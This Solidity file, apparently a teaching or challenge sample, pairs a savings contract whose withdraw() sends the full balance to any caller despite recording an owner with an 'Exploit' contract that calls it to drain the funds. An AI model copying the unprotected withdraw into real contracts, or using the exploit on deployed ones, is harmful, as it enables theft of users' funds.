pragma solidity 0.8.19;

contract ISavings {
    address owner;
    
    event Deposit(address indexed depositor, uint256 amount);
    event Withdraw(address indexed withdrawer, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        emit Withdraw(msg.sender, balance);
    }
}

contract Exploit {
    address target;
    constructor(address targetAddress) payable {
        target = targetAddress;
    }

    function attack() external {
        ISavings iSavings = ISavings(target);
        iSavings.withdraw();
    }
    
    receive() external payable {}
}
